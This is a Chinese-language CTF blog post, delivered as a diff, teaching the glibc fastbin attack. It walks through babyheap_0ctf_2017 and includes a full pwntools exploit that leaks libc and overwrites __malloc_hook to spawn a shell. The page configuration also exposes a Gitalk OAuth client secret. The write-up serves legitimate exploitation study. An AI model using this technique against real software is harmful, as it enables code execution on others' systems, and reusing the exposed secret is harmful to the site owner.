@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF, pwn, heap, 堆漏洞, fastbin, fastbinAttack,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    heap - 12 - fastbin attack |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-heap-12-fastbin_attack"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  heap - 12 - fastbin attack
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/05/heap-12-fastbin_attack/" class="article-date">
+  <time datetime="2020-05-04T16:00:00.000Z" itemprop="datePublished">2020-05-05</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">5 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>利用Fastbin attack进行任意地址读写</p>
+<h2 id="1-原理">1. 原理</h2>
+<ul>
+<li>fastbin attack 存在的原因在于 fastbin 是使用fast chunk的fd指针，即单链表来维护释放的堆块的</li>
+<li>并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空</li>
+<li>利用的条件是
+<ul>
+<li>能够控制fast chunk的fd指针</li>
+<li>漏洞发生在fast chunk类型上</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-Arbitrary-Alloc">2. Arbitrary Alloc</h2>
+<h3 id="1-介绍">1) 介绍</h3>
+<ul>
+<li>
+<p>如果我们更改fastbin链尾的fast chunk fd指针为我们的目的地址<br>
+则在几次malloc后，fastbin指针就会指向我们的目的地址<br>
+下一次malloc fast_chunk就会取得目的地址的指针，然后就可以进行读写了（操作取决于程序）</p>
+<a id="more"></a>
+<ul>
+<li>
+<p>例子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始时malloc两个fast chunk</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">char</span> * fast_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放第二个fast chunk</span></span><br><span class="line"><span class="built_in">free</span>(fast_chunk2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时fastbin链上的情况为</span></span><br><span class="line">fastbinY[<span class="number">2</span>] -&gt; fast_chunk2 -&gt; <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果此时利用堆溢出，在fast_chunk1内存处进行内存写，使fast_chunk2的fd指针指向其目的地址（假设目的地址为0x7f1234)</span></span><br><span class="line"><span class="comment">// 那么此时fastbin链上的情况就为</span></span><br><span class="line">fastbinY[<span class="number">2</span>] -&gt; fast_chunk2 -&gt; <span class="number">0x7f1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行一次malloc</span></span><br><span class="line">fast_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="comment">// 此时fastbin链上的情况为</span></span><br><span class="line">fastbinY[<span class="number">2</span>]  -&gt; <span class="number">0x7f1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以再malloc一次就可以得到其指针了</span></span><br><span class="line"><span class="keyword">char</span> * targetPointer = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>注意，申请fast chunk时，malloc内会有相应的检测，所以我们必须尝试绕过</p>
+<ul>
+<li>
+<ol>
+<li>所申请的fast chunk， 其 PREV_INUSE 必须始终为1</li>
+</ol>
+<ul>
+<li>目的地址一般都是__malloc_hook指针附近，该位置附近的内存中，0x7fxxxx的值会比较容易找到，所以在查找可用的目的地址时，fake_fast_chunk的size最好为0x7f</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>所申请的fast chunk, 其所在的fastbin的索引必须和其size所显示的索引一致</li>
+</ol>
+<ul>
+<li>即，如果目的地址上的fake_fast_chunk的size为0x7f，那么上述例子中，fast_chunk2的size最好为0x70，此时fake_fast_chunk所在fastbin的索引是正确的，可以通过malloc的检测。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-一个稍微有点难的例子-——-babyheap-0ctf-2017">2) 一个稍微有点难的例子 —— babyheap_0ctf_2017</h3>
+<h4 id="分析">分析</h4>
+<ul>
+<li>这个程序保护全开，但在fill函数处，有一个无限制写入的堆溢出漏洞</li>
+<li>所以我们可以尝试通过fastbin attack, malloc到__malloc_hook指针所在的内存处</li>
+<li>然后通过修改__malloc_hook为one_gadget的地址，再malloc一下就get shell</li>
+</ul>
+<blockquote>
+<p>但这里有个问题，如何获取libc基地址</p>
+</blockquote>
+<ul>
+<li>我们可以利用一个特性：<br>
+当unsorted bin链上只有一个unsorted chunk，其fd和bk指针都是指向main_arena的。<br>
+而main_arena在libc的data段上，所以只要泄露出其fd或者bk指针，通过计算偏移，就可以计算处libc的基地址</li>
+</ul>
+<blockquote>
+<p>现在我们将问题转化为，如何获取 unsorted chunk的fd指针值</p>
+</blockquote>
+<ul>
+<li>
+<p>我们可以这样做</p>
+<ul>
+<li>
+<p>首先malloc4块chunk</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * fast_chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">// 为啥0x60，因为此时的fast chunk的size为0x70，与size为0x7f的fast chunk处于同一个索引的fast bin链</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">char</span> * unsorted_chunk = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">// 防止unsorted chunk在free时，与top chunk合并</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/heap-12-fastbin_attack/malloc4chunk.png" alt="img"></p>
+</li>
+<li>
+<p>然后通过堆溢出，修改fast_chunk_2的size为 0x180，使 unsorted chunk 完全包含于fast_chunk_2<br>
+<img src="/2020/05/heap-12-fastbin_attack/coverUnsortedChunk.png" alt="img"></p>
+</li>
+<li>
+<p>然后free掉fast_chunk_2 再malloc(0x170)回来，此时fast_chunk_2的读写范围扩大了</p>
+</li>
+<li>
+<p>这时候我们要释放unsorted chunk，由于unsorted bin的size在malloc fast_chunk_2时被清零了，所以需要修复一下<br>
+修复好后再free掉unsorted chunk<br>
+<img src="/2020/05/heap-12-fastbin_attack/recoverUnsortedChunk.png" alt="img"></p>
+</li>
+<li>
+<p>此时便可以通过fast_chunk_2 来输出main_arena地址</p>
+</li>
+</ul>
+</li>
+<li>
+<p>得知main_arena地址，计算出__malloc_hook和one_gadget地址后，我们便可以实现一次fastbin attack</p>
+<ul>
+<li>注意此时fast_chunk_2的size值为0x181,所以首先我们就修改fast_chunk_2的size为0x71<br>
+否则free时，fast_chunk_2不会被放进fast bin里<br>
+然后把该chunk free掉<br>
+<img src="/2020/05/heap-12-fastbin_attack/freeFast_chunk_2.png" alt="img"></li>
+<li>然后现在我们来找找目标地址附近，该找哪一块空间，来作为fake_fast_chunk的起始地址<br>
+我们很容易就可以发现，这个地址符合要求。<br>
+<img src="/2020/05/heap-12-fastbin_attack/findfake.png" alt="img"></li>
+<li>接下来修改fast_chunk_2的fd指针为fake_fast_chunk的地址<br>
+<img src="/2020/05/heap-12-fastbin_attack/fakeChunk_fastbin.png" alt="img"></li>
+</ul>
+</li>
+<li>
+<p>然后两次malloc(0x60)，就可以申请到目标地址的内存了</p>
+</li>
+<li>
+<p>接下来就是修改__malloc_hook为one_gadget，然后再来个malloc就可以get shell.</p>
+</li>
+</ul>
+<h3 id="EXP">EXP</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29766</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">"./babyheap_0ctf_2017"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(len(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    msg = io.recvuntil(<span class="string">"1. Allocate"</span>)</span><br><span class="line">    <span class="keyword">return</span> msg[:<span class="number">-11</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>) </span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x181</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x170</span>)</span><br><span class="line">fill(<span class="number">1</span>, flat(cyclic(<span class="number">0x68</span>), <span class="number">0x111</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">msg = dump(<span class="number">1</span>)</span><br><span class="line">arena_addr = u64(msg[<span class="number">0x70</span>:<span class="number">0x78</span>]) - <span class="number">88</span></span><br><span class="line">libc_addr = arena_addr - (<span class="number">0x7ff41d02eb20</span> - <span class="number">0x7ff41cc6a000</span>)</span><br><span class="line">malloc_hook_addr = arena_addr - <span class="number">0x10</span></span><br><span class="line">fake_fastchunk_addr = malloc_hook_addr - <span class="number">0x23</span></span><br><span class="line">one_gadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"arena address: "</span> + hex(arena_addr))</span><br><span class="line">log.success(<span class="string">"libc address: "</span> + hex(libc_addr))</span><br><span class="line">log.success(<span class="string">"__malloc_hook address: "</span> + hex(malloc_hook_addr))</span><br><span class="line">log.success(<span class="string">"fake_fastchunk address: "</span> + hex(fake_fastchunk_addr))</span><br><span class="line">log.success(<span class="string">"one_gadget address: "</span> + hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>, fake_fastchunk_addr))</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">fill(<span class="number">2</span>, flat(cyclic(<span class="number">19</span>), one_gadget_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/05/heap-12-fastbin_attack/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BUUOJ/" rel="tag">BUUOJ</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/05/Welcome/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Welcome
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/heap-10-_int_free_process/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">heap - 10 - _int_free的相关操作</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
